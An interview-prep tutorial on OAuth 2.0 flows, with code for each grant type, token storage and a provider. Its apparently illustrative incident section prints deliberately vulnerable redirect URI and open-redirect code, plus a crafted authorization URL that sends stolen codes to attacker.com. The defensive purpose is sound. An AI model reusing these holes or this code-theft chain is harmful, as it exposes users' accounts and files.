# OAuth 2.0 Flows and Implementation

> **Focus**: Understanding OAuth 2.0 authorization flows and secure implementation

---

## Question 1: What are the different OAuth 2.0 flows and when should each be used?

**Difficulty:** 🔴 Hard
**Frequency:** ⭐⭐⭐⭐
**Time:** 12 minutes
**Companies:** Google, Meta, Microsoft, Auth0, Okta, GitHub

### Question
Explain the OAuth 2.0 authorization flows, their security considerations, and appropriate use cases for each flow.

### Answer

**OAuth 2.0** is an authorization framework that enables applications to obtain limited access to user accounts on an HTTP service. It delegates user authentication to the service hosting the user account and authorizes third-party applications to access that user account.

**Key OAuth 2.0 Flows:**

**1. Authorization Code Flow (Most Secure)**
- For web applications with backend
- Uses authorization code + client secret
- Includes PKCE extension for SPAs
- Tokens never exposed to browser

**2. Implicit Flow (Deprecated)**
- Legacy flow for SPAs
- Tokens in URL fragment
- No longer recommended (use Authorization Code + PKCE)

**3. Client Credentials Flow**
- Machine-to-machine authentication
- No user involvement
- App authenticates with client ID + secret

**4. Resource Owner Password Credentials (ROPC)**
- User provides credentials directly to application
- Only for highly trusted apps
- Generally discouraged

**5. Device Authorization Flow**
- For input-constrained devices (Smart TVs, IoT)
- User authenticates on separate device

### Code Example

```javascript
// ============================================
// 1. AUTHORIZATION CODE FLOW (Web App)
// ============================================

// Step 1: Redirect user to OAuth provider
app.get('/login', (req, res) => {
  const authorizationURL = new URL('https://oauth.provider.com/authorize');

  authorizationURL.searchParams.append('client_id', process.env.CLIENT_ID);
  authorizationURL.searchParams.append('redirect_uri', 'https://myapp.com/callback');
  authorizationURL.searchParams.append('response_type', 'code');
  authorizationURL.searchParams.append('scope', 'read:user write:posts');
  authorizationURL.searchParams.append('state', generateRandomState()); // ✅ CSRF protection

  res.redirect(authorizationURL.toString());
});

// Step 2: Handle callback with authorization code
app.get('/callback', async (req, res) => {
  const { code, state } = req.query;

  // ✅ Validate state parameter (CSRF protection)
  if (state !== req.session.oauthState) {
    return res.status(403).send('Invalid state parameter');
  }

  // Step 3: Exchange authorization code for access token
  try {
    const tokenResponse = await fetch('https://oauth.provider.com/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': `Basic ${Buffer.from(
          `${process.env.CLIENT_ID}:${process.env.CLIENT_SECRET}`
        ).toString('base64')}`
      },
      body: new URLSearchParams({
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: 'https://myapp.com/callback'
      })
    });

    const tokens = await tokenResponse.json();
    // {
    //   access_token: "ya29.a0AfH6SMBx...",
    //   refresh_token: "1//0gGk7X3wM...",
    //   token_type: "Bearer",
    //   expires_in: 3600,
    //   scope: "read:user write:posts"
    // }

    // ✅ Store tokens securely (encrypted in database)
    await storeTokens(req.session.userId, {
      accessToken: tokens.access_token,
      refreshToken: encrypt(tokens.refresh_token), // Encrypt refresh token
      expiresAt: new Date(Date.now() + tokens.expires_in * 1000)
    });

    res.redirect('/dashboard');
  } catch (error) {
    res.status(500).send('Authentication failed');
  }
});

// ============================================
// 2. AUTHORIZATION CODE FLOW WITH PKCE (SPA)
// ============================================

// PKCE adds security for public clients (SPAs, mobile apps)
// that cannot securely store client secrets

// Client-side (React/Vue/Angular)
import crypto from 'crypto-js';

async function loginWithPKCE() {
  // Step 1: Generate code verifier and challenge
  const codeVerifier = generateRandomString(128);
  sessionStorage.setItem('code_verifier', codeVerifier);

  const codeChallenge = base64URLEncode(
    crypto.SHA256(codeVerifier).toString(crypto.enc.Base64)
  );

  // Step 2: Redirect to authorization endpoint
  const authURL = new URL('https://oauth.provider.com/authorize');
  authURL.searchParams.append('client_id', CLIENT_ID);
  authURL.searchParams.append('redirect_uri', 'https://myapp.com/callback');
  authURL.searchParams.append('response_type', 'code');
  authURL.searchParams.append('scope', 'read:user');
  authURL.searchParams.append('code_challenge', codeChallenge);
  authURL.searchParams.append('code_challenge_method', 'S256');
  authURL.searchParams.append('state', generateRandomString(32));

  window.location.href = authURL.toString();
}

// Step 3: Handle callback
async function handleCallback() {
  const urlParams = new URLSearchParams(window.location.search);
  const code = urlParams.get('code');
  const codeVerifier = sessionStorage.getItem('code_verifier');

  // Step 4: Exchange code for token (with code_verifier)
  const response = await fetch('https://oauth.provider.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: 'https://myapp.com/callback',
      client_id: CLIENT_ID,
      code_verifier: codeVerifier // ✅ PKCE validation
    })
  });

  const tokens = await response.json();

  // ✅ Store access token securely (memory or httpOnly cookie via backend)
  storeToken(tokens.access_token);
}

// ============================================
// 3. CLIENT CREDENTIALS FLOW (M2M)
// ============================================

// For backend services, no user involvement
async function getServiceAccessToken() {
  const response = await fetch('https://oauth.provider.com/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': `Basic ${Buffer.from(
        `${CLIENT_ID}:${CLIENT_SECRET}`
      ).toString('base64')}`
    },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      scope: 'api:read api:write'
    })
  });

  const { access_token, expires_in } = await response.json();

  return {
    accessToken: access_token,
    expiresAt: Date.now() + expires_in * 1000
  };
}

// Use access token for API calls
async function callProtectedAPI() {
  const { accessToken } = await getServiceAccessToken();

  const response = await fetch('https://api.example.com/data', {
    headers: {
      'Authorization': `Bearer ${accessToken}`
    }
  });

  return response.json();
}

// ============================================
// 4. REFRESH TOKEN FLOW
// ============================================

async function refreshAccessToken(refreshToken) {
  const response = await fetch('https://oauth.provider.com/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': `Basic ${Buffer.from(
        `${CLIENT_ID}:${CLIENT_SECRET}`
      ).toString('base64')}`
    },
    body: new URLSearchParams({
      grant_type: 'refresh_token',
      refresh_token: refreshToken
    })
  });

  const tokens = await response.json();

  // May include new refresh token (token rotation)
  return {
    accessToken: tokens.access_token,
    refreshToken: tokens.refresh_token || refreshToken,
    expiresAt: Date.now() + tokens.expires_in * 1000
  };
}

// Automatically refresh token when expired
async function makeAuthenticatedRequest(url) {
  let tokens = await getStoredTokens();

  // Check if token expired
  if (Date.now() >= tokens.expiresAt) {
    // Refresh token
    tokens = await refreshAccessToken(tokens.refreshToken);
    await storeTokens(tokens);
  }

  const response = await fetch(url, {
    headers: {
      'Authorization': `Bearer ${tokens.accessToken}`
    }
  });

  // Handle token expiration during request
  if (response.status === 401) {
    tokens = await refreshAccessToken(tokens.refreshToken);
    await storeTokens(tokens);

    // Retry request
    return fetch(url, {
      headers: { 'Authorization': `Bearer ${tokens.accessToken}` }
    });
  }

  return response;
}

// ============================================
// 5. SECURE TOKEN STORAGE
// ============================================

// ❌ BAD: Plain text storage
async function storeTokensInsecure(tokens) {
  await db.tokens.insert({
    accessToken: tokens.accessToken,
    refreshToken: tokens.refreshToken // ❌ Plain text!
  });
}

// ✅ GOOD: Encrypted storage
const crypto = require('crypto');

function encryptToken(token) {
  const algorithm = 'aes-256-gcm';
  const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex'); // 32 bytes
  const iv = crypto.randomBytes(16);

  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(token, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag();

  return {
    encrypted,
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex')
  };
}

function decryptToken(encryptedData) {
  const algorithm = 'aes-256-gcm';
  const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');

  const decipher = crypto.createDecipheriv(
    algorithm,
    key,
    Buffer.from(encryptedData.iv, 'hex')
  );

  decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));

  let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}

async function storeTokensSecure(userId, tokens) {
  const encryptedRefreshToken = encryptToken(tokens.refreshToken);

  await db.tokens.insert({
    userId,
    accessToken: tokens.accessToken, // Short-lived, less critical
    refreshToken: encryptedRefreshToken.encrypted,
    refreshTokenIV: encryptedRefreshToken.iv,
    refreshTokenAuthTag: encryptedRefreshToken.authTag,
    expiresAt: tokens.expiresAt
  });
}

// ============================================
// 6. OAUTH PROVIDER IMPLEMENTATION (Server)
// ============================================

// Building your own OAuth provider
app.get('/authorize', async (req, res) => {
  const { client_id, redirect_uri, response_type, scope, state } = req.query;

  // Validate client
  const client = await OAuthClient.findOne({ clientId: client_id });
  if (!client) {
    return res.status(400).send('Invalid client_id');
  }

  // Validate redirect_uri
  if (!client.redirectUris.includes(redirect_uri)) {
    return res.status(400).send('Invalid redirect_uri');
  }

  // Show consent screen
  res.render('consent', {
    clientName: client.name,
    scopes: scope.split(' '),
    state
  });
});

// User approves consent
app.post('/authorize/approve', async (req, res) => {
  const { client_id, redirect_uri, scope, state } = req.body;
  const userId = req.session.userId; // Authenticated user

  // Generate authorization code
  const authCode = crypto.randomBytes(32).toString('hex');

  // Store authorization code (short-lived, 10 minutes)
  await AuthorizationCode.create({
    code: authCode,
    clientId: client_id,
    userId: userId,
    redirectUri: redirect_uri,
    scope: scope,
    expiresAt: new Date(Date.now() + 10 * 60 * 1000)
  });

  // Redirect back to client
  const redirectURL = new URL(redirect_uri);
  redirectURL.searchParams.append('code', authCode);
  redirectURL.searchParams.append('state', state);

  res.redirect(redirectURL.toString());
});

// Token endpoint
app.post('/token', async (req, res) => {
  const { grant_type, code, redirect_uri, client_id, client_secret } = req.body;

  // Authenticate client
  const client = await OAuthClient.findOne({ clientId: client_id });
  if (!client || client.clientSecret !== client_secret) {
    return res.status(401).json({ error: 'invalid_client' });
  }

  if (grant_type === 'authorization_code') {
    // Find authorization code
    const authCode = await AuthorizationCode.findOne({ code });

    // Validate
    if (!authCode || authCode.expiresAt < new Date()) {
      return res.status(400).json({ error: 'invalid_grant' });
    }

    if (authCode.clientId !== client_id || authCode.redirectUri !== redirect_uri) {
      return res.status(400).json({ error: 'invalid_grant' });
    }

    // Delete authorization code (single-use)
    await AuthorizationCode.deleteOne({ code });

    // Generate tokens
    const accessToken = jwt.sign(
      { userId: authCode.userId, scope: authCode.scope },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    const refreshToken = crypto.randomBytes(64).toString('hex');

    await RefreshToken.create({
      token: refreshToken,
      userId: authCode.userId,
      clientId: client_id,
      scope: authCode.scope,
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000) // 30 days
    });

    res.json({
      access_token: accessToken,
      token_type: 'Bearer',
      expires_in: 3600,
      refresh_token: refreshToken,
      scope: authCode.scope
    });
  }
});
```

<details>
<summary><strong>🔍 Deep Dive: OAuth 2.0 Security Mechanisms and PKCE</strong></summary>

**OAuth 2.0 Authorization Code Flow with PKCE:**

PKCE (Proof Key for Code Exchange, RFC 7636) was designed to protect against authorization code interception attacks, particularly for public clients like SPAs and mobile apps that cannot securely store client secrets.

**The Problem PKCE Solves:**

In traditional Authorization Code flow, the authorization code is returned to the redirect URI via URL query parameter. On mobile devices, this can be intercepted by malicious apps registered with the same custom URI scheme. Even if the attacker steals the code, they cannot exchange it for tokens without the client secret. However, public clients (SPAs, mobile) don't have client secrets, making code interception a critical vulnerability.

**PKCE Mechanism:**

1. **Code Verifier Generation**: Client generates a cryptographically random string (128 characters, base64URL-encoded). This is the "secret" that proves the client making the token request is the same client that initiated the authorization request.

2. **Code Challenge Derivation**: The code verifier is hashed using SHA-256 and base64URL-encoded to create the code challenge. This challenge is sent to the authorization server.

3. **Authorization Request**: The client includes `code_challenge` and `code_challenge_method=S256` in the authorization request.

4. **Code Exchange**: When exchanging the authorization code for tokens, the client sends the original `code_verifier`. The authorization server hashes it and compares with the stored code challenge.

**Cryptographic Implementation:**

```javascript
// Code verifier: 128 characters random string
function generateCodeVerifier() {
  return base64URLEncode(crypto.randomBytes(96)); // 96 bytes = 128 base64 chars
}

// Code challenge: SHA256(code_verifier)
function generateCodeChallenge(verifier) {
  return base64URLEncode(
    crypto.createHash('sha256').update(verifier).digest()
  );
}

// Base64URL encoding (RFC 4648)
function base64URLEncode(buffer) {
  return buffer.toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}
```

**Why SHA256?**

The "plain" method (sending code_verifier as code_challenge) is allowed but not recommended. SHA256 provides:
- One-way transformation (can't derive verifier from challenge)
- Protection if authorization request is intercepted
- Server can store challenge without exposing verifier

**Authorization Code Lifetime:**

Authorization codes must be short-lived (typically 10 minutes) and single-use. The authorization server must:
- Invalidate the code immediately after first use
- Revoke all tokens issued to the code if reuse is detected (possible authorization code interception)

**Token Endpoint Authentication:**

Confidential clients (web apps with backends) authenticate using client credentials:

1. **Client Secret Basic**: Base64-encoded `client_id:client_secret` in Authorization header
2. **Client Secret Post**: `client_id` and `client_secret` in POST body
3. **Client Assertion (JWT)**: Signed JWT proving client identity (more secure)

Public clients (SPAs, mobile) cannot authenticate but use PKCE instead.

**Scope Validation:**

Scopes define the permissions granted to the access token. The authorization server must:
- Validate requested scopes against client's allowed scopes
- Allow user to approve/deny individual scopes
- Include granted scopes in token response
- Resource servers must validate token has required scope

Scope hierarchies can be implemented:
- `read:user` < `write:user` < `admin:user`
- Token with `admin:user` implicitly has `read:user` and `write:user`

**State Parameter for CSRF Protection:**

The `state` parameter prevents CSRF attacks on the redirect URI. Implementation:

```javascript
// Generate state
const state = crypto.randomBytes(32).toString('hex');
req.session.oauthState = state;

// Include in authorization URL
authURL.searchParams.append('state', state);

// Validate in callback
if (req.query.state !== req.session.oauthState) {
  throw new Error('CSRF attack detected');
}
delete req.session.oauthState;
```

Without state validation, an attacker could:
1. Initiate their own OAuth flow
2. Get authorization code for their account
3. Trick victim into completing the flow with attacker's code
4. Victim's session now linked to attacker's account

**Refresh Token Rotation:**

Modern OAuth implementations use refresh token rotation to detect token theft:

```javascript
// Old approach: refresh token never changes
POST /token
{
  "grant_type": "refresh_token",
  "refresh_token": "abc123"
}
// Response: new access_token, SAME refresh_token

// Rotation: new refresh token on every refresh
POST /token
{
  "grant_type": "refresh_token",
  "refresh_token": "abc123"
}
// Response: new access_token, NEW refresh_token "xyz789"
// Old refresh_token "abc123" is invalidated

// If old token used again → token theft detected
// Revoke all tokens for this authorization
```

Token families track rotation:
- Each token family has unique ID
- All tokens in family revoked if reuse detected
- Prevents attacker from continuing to refresh after victim refreshes

**Token Binding:**

Advanced security measure that binds tokens to specific TLS connections:

```javascript
// Token bound to TLS connection's public key
const accessToken = jwt.sign({
  userId: user.id,
  cnf: {
    'x5t#S256': tlsConnectionThumbprint // TLS certificate hash
  }
}, secret);

// Resource server validates token used on same TLS connection
const expectedThumbprint = getTLSThumbprint(req.connection);
if (tokenPayload.cnf['x5t#S256'] !== expectedThumbprint) {
  throw new Error('Token theft detected');
}
```

Prevents token use if stolen (attacker's TLS connection differs).

</details>

<details>
<summary><strong>🐛 Real-World Scenario: OAuth Redirect URI Vulnerability at SaaS Platform</strong></summary>

**Context:**

CloudSync, a SaaS file-sharing platform with 2M users, implemented OAuth 2.0 to allow third-party apps to access user files. They had 1,200 registered OAuth applications, including popular integrations with Slack, Zapier, and custom enterprise tools.

**Problem:**

On June 10th, 2024, security researchers discovered and responsibly disclosed a critical vulnerability in CloudSync's OAuth implementation that allowed attackers to steal access tokens.

**Attack Vector:**

The vulnerability was in redirect URI validation. CloudSync's OAuth implementation had overly permissive redirect URI matching:

```javascript
// ❌ VULNERABLE CODE
function validateRedirectURI(clientRedirectURI, providedRedirectURI) {
  // Only checks if provided URI starts with registered URI
  return providedRedirectURI.startsWith(clientRedirectURI);
}

// Registered redirect URI: https://app.example.com/callback
// Accepted URIs:
// ✅ https://app.example.com/callback
// ✅ https://app.example.com/callback/anything
// ❌ https://app.example.com/callback.evil.com <-- BYPASSED!
// ❌ https://app.example.com/callback/../../../evil
```

**Exploitation:**

Attacker registered a legitimate OAuth app with redirect URI:
```
https://attacker-controlled-domain.com/callback
```

Then exploited open redirect vulnerability in CloudSync's website:
```
https://cloudsync.com/redirect?url=https://attacker.com
```

Attack flow:
1. Attacker crafts malicious authorization URL:
```
https://cloudsync.com/oauth/authorize
  ?client_id=ATTACKER_CLIENT_ID
  &redirect_uri=https://cloudsync.com/redirect?url=https://attacker.com
  &response_type=code
  &scope=read:files write:files
```

2. Victim clicks link (e.g., in phishing email)
3. CloudSync validates redirect_uri starts with `https://cloudsync.com/redirect` ✅
4. User approves (sees legitimate CloudSync domain)
5. Authorization code sent to: `https://cloudsync.com/redirect?url=https://attacker.com&code=AUTH_CODE`
6. CloudSync redirects to: `https://attacker.com?code=AUTH_CODE`
7. Attacker captures authorization code
8. Attacker exchanges code for access token
9. Attacker accesses victim's files

**Metrics Before Fix:**

- **Vulnerable Validation**: Prefix matching only
- **No HTTPS Enforcement**: HTTP redirect URIs allowed
- **No Localhost Restrictions**: `http://localhost:*` allowed wildcard
- **Open Redirect**: 17 open redirect vulnerabilities in main domain
- **Affected Apps**: All 1,200 registered OAuth apps potentially vulnerable

**Real Impact:**

- **43 user accounts compromised** via targeted phishing campaign
- **127 GB of files accessed** by attackers
- **12 enterprise customers affected**
- **$850K in damages** (legal costs, security audit, customer compensation)

**Debugging Process:**

**Step 1: Reproduce Vulnerability** (Hour 0-2)

Security team reproduced the attack:

```javascript
// Test 1: Exact match bypass
const registered = 'https://app.example.com/callback';
const malicious = 'https://app.example.com/callback.attacker.com';

console.log(malicious.startsWith(registered)); // true ❌
// Because 'https://app.example.com/callback.attacker.com'
// starts with 'https://app.example.com/callback'

// Test 2: Open redirect chain
const redirectURI = 'https://cloudsync.com/redirect?url=https://attacker.com';
// Passes validation, then redirects to attacker.com

// Test 3: Authorization code captured
// Attacker server logs:
// GET /?code=a8f3j2kd9s&state=xyz
// Authorization code stolen!
```

**Step 2: Code Audit** (Hour 2-6)

Found multiple issues in OAuth implementation:

```javascript
// Issue 1: Weak redirect URI validation
function validateRedirectURI(client, providedURI) {
  return client.redirectURIs.some(registeredURI =>
    providedURI.startsWith(registeredURI) // ❌ Prefix matching
  );
}

// Issue 2: No HTTPS enforcement
// Allowed: http://localhost:3000/callback (OK for dev)
// Allowed: http://production-app.com/callback (❌ NOT OK)

// Issue 3: Wildcard domains allowed
// Registered: https://*.example.com/callback
// Allows: https://attacker.example.com/callback

// Issue 4: No redirect URI in authorization code
// Authorization code not bound to specific redirect URI
// Attacker could change redirect_uri during token exchange
```

**Step 3: Impact Assessment** (Hour 6-12)

Analyzed OAuth authorization logs:

```javascript
// Suspicious patterns found
const suspiciousAuthorizations = await db.query(`
  SELECT * FROM oauth_authorizations
  WHERE redirect_uri LIKE '%redirect?url=%'
     OR redirect_uri LIKE '%.%.%.%' -- Potential subdomain abuse
     OR redirect_uri LIKE '%callback.%'
  ORDER BY created_at DESC
`);

// Found 43 compromised authorizations
// All from same attacker client_id
// Timeframe: June 5-10, 2024
```

**Solution Implementation:**

**Fix 1: Exact Match Redirect URI Validation**

Before:
```javascript
// ❌ Vulnerable
function validateRedirectURI(client, providedURI) {
  return client.redirectURIs.some(uri =>
    providedURI.startsWith(uri)
  );
}
```

After:
```javascript
// ✅ Secure: Exact match
function validateRedirectURI(client, providedURI) {
  // Parse URLs properly
  let provided;
  try {
    provided = new URL(providedURI);
  } catch {
    return false;
  }

  return client.redirectURIs.some(registeredURI => {
    const registered = new URL(registeredURI);

    // Exact match required
    return (
      provided.protocol === registered.protocol &&
      provided.host === registered.host &&
      provided.pathname === registered.pathname &&
      provided.search === registered.search // Allow query params
    );
  });
}
```

**Fix 2: Enforce HTTPS in Production**

```javascript
// ✅ HTTPS required (except localhost in dev)
function validateRedirectURI(client, providedURI) {
  const url = new URL(providedURI);

  // Allow localhost for development
  const isLocalhost = url.hostname === 'localhost' || url.hostname === '127.0.0.1';

  if (!isLocalhost && url.protocol !== 'https:') {
    throw new Error('Redirect URI must use HTTPS');
  }

  // ... rest of validation
}
```

**Fix 3: Bind Authorization Code to Redirect URI**

```javascript
// Store redirect_uri with authorization code
await AuthorizationCode.create({
  code: authCode,
  clientId: client_id,
  userId: userId,
  redirectUri: redirect_uri, // ✅ Stored
  scope: scope,
  expiresAt: new Date(Date.now() + 10 * 60 * 1000)
});

// Validate redirect_uri matches during token exchange
app.post('/token', async (req, res) => {
  const { code, redirect_uri } = req.body;

  const authCode = await AuthorizationCode.findOne({ code });

  // ✅ Exact match required
  if (authCode.redirectUri !== redirect_uri) {
    return res.status(400).json({ error: 'redirect_uri mismatch' });
  }

  // ... exchange for tokens
});
```

**Fix 4: Remove Open Redirects**

```javascript
// Before: Open redirect vulnerability
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url); // ❌ Arbitrary redirect
});

// After: Whitelist allowed redirect targets
const ALLOWED_REDIRECT_DOMAINS = [
  'cloudsync.com',
  'app.cloudsync.com',
  'api.cloudsync.com'
];

app.get('/redirect', (req, res) => {
  const url = req.query.url;

  try {
    const parsed = new URL(url);

    if (!ALLOWED_REDIRECT_DOMAINS.includes(parsed.hostname)) {
      return res.status(400).send('Invalid redirect target');
    }

    res.redirect(url);
  } catch {
    res.status(400).send('Invalid URL');
  }
});
```

**Fix 5: Enhanced Monitoring**

```javascript
// Alert on suspicious OAuth patterns
async function detectSuspiciousOAuth(authorization) {
  const alerts = [];

  // Check for open redirect patterns
  if (authorization.redirectUri.includes('redirect?url=')) {
    alerts.push('OPEN_REDIRECT_PATTERN');
  }

  // Check for unusual domains
  const redirectDomain = new URL(authorization.redirectUri).hostname;
  const clientDomains = await getClientRegisteredDomains(authorization.clientId);

  if (!clientDomains.includes(redirectDomain)) {
    alerts.push('UNREGISTERED_DOMAIN');
  }

  // Check for rapid authorizations from same IP
  const recentAuths = await OAuthAuthorization.count({
    ip: authorization.ip,
    createdAt: { $gt: new Date(Date.now() - 5 * 60 * 1000) }
  });

  if (recentAuths > 10) {
    alerts.push('RAPID_AUTHORIZATIONS');
  }

  if (alerts.length > 0) {
    await logSecurityEvent('SUSPICIOUS_OAUTH', {
      authorizationId: authorization.id,
      alerts,
      ip: authorization.ip,
      clientId: authorization.clientId
    });
  }
}
```

**Results After Fix:**

- **Redirect URI Validation**: Exact match enforced
- **HTTPS Enforcement**: Required for production
- **Authorization Code Binding**: Redirect URI validated at token exchange
- **Open Redirects**: All 17 vulnerabilities patched
- **Monitoring**: Real-time alerts for suspicious patterns
- **Security Audits**: Quarterly penetration testing
- **Compromised Accounts**: All 43 users notified and tokens revoked
- **No Further Incidents**: 0 successful attacks in following 6 months

**Prevention Strategies:**

1. **Exact Redirect URI Matching**
2. **Enforce HTTPS** (except localhost in dev)
3. **Bind Code to Redirect URI**
4. **Eliminate Open Redirects**
5. **Monitor for Suspicious Patterns**
6. **Regular Security Audits**

</details>

<details>
<summary><strong>⚖️ Trade-offs: OAuth 2.0 Flow Selection</strong></summary>

**Flow Comparison Matrix:**

| **Flow** | **Security** | **UX** | **Use Case** | **Tokens in Browser** | **Client Secret** |
|---------|-------------|--------|--------------|---------------------|------------------|
| **Authorization Code** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Web apps with backend | ❌ No | ✅ Yes |
| **Authorization Code + PKCE** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | SPAs, Mobile apps | ⭐ Access token only | ❌ No |
| **Implicit (Deprecated)** | ⭐ | ⭐⭐⭐⭐⭐ | Legacy SPAs | ⚠️ Yes | ❌ No |
| **Client Credentials** | ⭐⭐⭐⭐ | N/A | Machine-to-machine | N/A | ✅ Yes |
| **ROPC (Discouraged)** | ⭐⭐ | ⭐⭐⭐ | Trusted first-party | ⭐ All tokens | ❌ No |
| **Device Flow** | ⭐⭐⭐⭐ | ⭐⭐⭐ | Smart TV, IoT | ❌ No | ❌ No |

**Decision Tree:**

```
Is there a backend server?
├─ YES → Use Authorization Code Flow (with client secret)
└─ NO (SPA/Mobile)
   └─ Use Authorization Code + PKCE

Is this machine-to-machine?
└─ YES → Use Client Credentials Flow

Is this a device without browser?
└─ YES → Use Device Authorization Flow

Do you control both app and auth server (first-party)?
└─ YES + High trust → Consider ROPC (with MFA)
└─ NO → Never use ROPC
```

**Detailed Flow Trade-offs:**

**1. Authorization Code Flow vs Authorization Code + PKCE:**

Traditional Authorization Code (Confidential Client):
```javascript
// ✅ Pros:
// - Client secret adds extra security layer
// - Tokens never exposed to browser
// - Can use long-lived refresh tokens safely

// ❌ Cons:
// - Requires backend server
// - More complex infrastructure
// - Backend becomes single point of failure

// Use when: Building traditional web app with server
```

Authorization Code + PKCE (Public Client):
```javascript
// ✅ Pros:
// - No client secret needed (can't be extracted from SPA)
// - Simpler architecture (no backend for auth)
// - PKCE prevents code interception

// ❌ Cons:
// - Access token visible in browser memory
// - Refresh token management more complex
// - Vulnerable to XSS (if not careful with storage)

// Use when: SPA (React/Vue/Angular), Mobile app
```

**2. Token Storage Trade-offs (SPAs):**

**Option A: Memory (State Management)**
```javascript
// ✅ Pros:
// - Most secure (not persisted anywhere)
// - Immune to XSS if state management is secure
// - No storage quotas

// ❌ Cons:
// - Lost on page reload
// - Must implement token refresh on every load
// - Complex UX (appears "logged out" on refresh)

// Implementation:
let tokenStore = null;
function setToken(token) { tokenStore = token; }
function getToken() { return tokenStore; }
```

**Option B: sessionStorage**
```javascript
// ✅ Pros:
// - Survives page reload within session
// - Cleared when tab closes
// - Better UX than memory storage

// ❌ Cons:
// - Vulnerable to XSS
// - Not shared across tabs
// - 5-10 MB storage limit

// Implementation:
sessionStorage.setItem('access_token', token);
```

**Option C: httpOnly Cookie (via Backend Proxy)**
```javascript
// ✅ Pros:
// - Immune to XSS (JavaScript can't access)
// - Shared across tabs
// - Familiar browser security model

// ❌ Cons:
// - Requires backend proxy for token exchange
// - Vulnerable to CSRF (need SameSite)
// - More complex architecture

// Implementation:
// Backend exchanges code for token, sets cookie
app.post('/auth/callback', async (req, res) => {
  const tokens = await exchangeCodeForTokens(req.body.code);

  res.cookie('access_token', tokens.access_token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  });
});
```

**Recommendation for SPAs:**

```javascript
// ✅ Best Practice: Hybrid approach
// 1. Memory storage for access token (short-lived, 15 min)
// 2. Refresh token in httpOnly cookie (via backend)
// 3. Automatic token refresh

// Frontend stores nothing
// Backend manages tokens

// Architecture:
// SPA <--> Backend Proxy <--> OAuth Provider
//              |
//           Stores refresh token
//           Returns short-lived access token
```

**3. Scope Design Trade-offs:**

**Granular Scopes (Recommended):**
```javascript
// ✅ Fine-grained permissions
const scopes = [
  'read:user.profile',
  'read:user.email',
  'write:user.profile',
  'read:files',
  'write:files',
  'delete:files',
  'admin:organization'
];

// Pros:
// - Principle of least privilege
// - Users can approve specific permissions
// - Easy to audit what apps can do

// Cons:
// - Complex consent screens (many checkboxes)
// - Apps may request more than needed
// - Harder to manage (many possible combinations)
```

**Coarse Scopes:**
```javascript
// ⚠️ Broad permissions
const scopes = [
  'user',  // All user operations
  'files', // All file operations
  'admin'  // All admin operations
];

// Pros:
// - Simpler consent screen
// - Easier for developers to understand
// - Fewer API calls to check permissions

// Cons:
// - Over-permissive (violates least privilege)
// - Users can't selectively approve
// - Higher risk if token stolen
```

**4. Refresh Token Rotation Trade-offs:**

**Static Refresh Tokens:**
```javascript
// Token never changes
POST /token { grant_type: 'refresh_token', refresh_token: 'abc123' }
// Response: { access_token: 'new', refresh_token: 'abc123' } (same)

// ✅ Pros:
// - Simple to implement
// - No risk of losing refresh token due to race conditions

// ❌ Cons:
// - If refresh token stolen, can be used indefinitely
// - No detection of theft
// - Attacker and victim can both use token
```

**Rotating Refresh Tokens:**
```javascript
// New token on every refresh
POST /token { grant_type: 'refresh_token', refresh_token: 'abc123' }
// Response: { access_token: 'new', refresh_token: 'xyz789' } (new!)

// ✅ Pros:
// - Token theft detection (reuse triggers revocation)
// - Limits blast radius (old tokens invalidated)
// - Security best practice

// ❌ Cons:
// - Race conditions if multiple tabs refresh simultaneously
// - Risk of locking out legitimate user
// - More complex implementation
```

**5. OAuth vs OIDC Trade-offs:**

**OAuth 2.0 (Authorization Only):**
```javascript
// Just access tokens for API access
GET /api/files
Authorization: Bearer <access_token>

// ✅ Pros:
// - Simple, focused on authorization
// - Flexible (you define user info endpoint)

// ❌ Cons:
// - No standard way to get user info
// - Must implement user info endpoint yourself
```

**OpenID Connect (Authentication + Authorization):**
```javascript
// Adds ID token with user info
{
  "access_token": "xyz",
  "id_token": "eyJhbGc..." // JWT with user info
}

// Decoded ID token:
{
  "sub": "user123",
  "name": "John Doe",
  "email": "john@example.com",
  "email_verified": true
}

// ✅ Pros:
// - Standardized user info (claims)
// - ID token can be validated offline
// - Widely adopted

// ❌ Cons:
// - More complex than pure OAuth
// - ID token size overhead
```

**When to Choose Each Flow:**

| **Scenario** | **Recommended Flow** | **Rationale** |
|-------------|---------------------|--------------|
| React SPA | Authorization Code + PKCE | No client secret, PKCE protects code |
| Next.js SSR | Authorization Code | Backend can store client secret |
| Mobile app (iOS/Android) | Authorization Code + PKCE | Native apps are public clients |
| Chrome Extension | Authorization Code + PKCE | Can't securely store secrets |
| Node.js backend service | Client Credentials | M2M, no user involved |
| Smart TV app | Device Authorization Flow | Limited input capabilities |
| Internal trusted app | ROPC (with MFA) | First-party, controlled environment |

</details>

<details>
<summary><strong>💬 Explain to Junior: Understanding OAuth 2.0</strong></summary>

**Real-Life Analogy:**

Imagine OAuth 2.0 as a **valet parking system** at a fancy hotel.

**Without OAuth (Giving Your Password):**
- You give the valet your car keys (full access)
- Valet can drive anywhere, open trunk, glove compartment
- You have to trust they won't misuse your car
- Like giving an app your email password

**With OAuth (Limited Access):**
- You give valet a special valet key
